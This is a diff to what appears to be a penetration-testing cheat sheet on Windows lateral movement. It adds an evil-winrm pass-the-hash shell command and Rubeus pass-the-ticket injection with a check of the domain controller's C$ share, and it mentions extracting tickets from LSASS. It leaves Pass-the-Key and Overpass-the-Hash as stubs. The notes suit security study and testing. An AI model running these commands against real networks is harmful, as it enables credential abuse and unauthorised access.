@@ -182,14 +182,34 @@ Start-ScheduledTask -CimSession $Session -TaskName $TaskName
 Unregister-ScheduledTask -CimSession $Session -TaskName $TaskName
 ```
 
-## NTLM - Pass-the-Hash
+## NTLM
+
+### Pass-the-Hash
 As a result of extracting credentials from a host an attacker might get NTLM hash. Sometimes it can be too hard to crack the hash but it's possible to authenticate with the hash itself.
 
-### Using WinRM
-
 ```bash
+# Get shell using NTLM hash
 evil-winrm -i <victim-ip> -u <username> -H <ntml-hash>
 ```
 
-## Kerberos - Pass-the-Ticket
-Sometimes it is possible to extract Kerberos tickets and session keys (both are required) from LSASS memory using e.g. `mimikatz`. Best tickets to steal are TGTs because they can be used to access any service. TGSs are only good for some specific services.
+## Kerberos
+
+### Pass-the-Ticket
+Sometimes it is possible to extract Kerberos tickets and session keys (both are required) from LSASS memory using e.g. `mimikatz` or `rubeus`. Best tickets to steal are TGTs because they can be used to access any service. TGSs are only good for some specific services. Injecting ticket in our own session doesn't require administrator privileges.
+
+```powershell
+# Inject ticket in the current logon session
+Rubeus.exe ptt /ticket:<b64-ticket|kirbi-file>
+
+# List Kerberos keys in memory (check if injected successfully)
+klist
+
+# Confirm that you have Administrator rights
+dir \\<dc-ip>\C$
+```
+
+### Pass-the-Key
+TBD
+
+### Overpass-the-Hash
+TBD
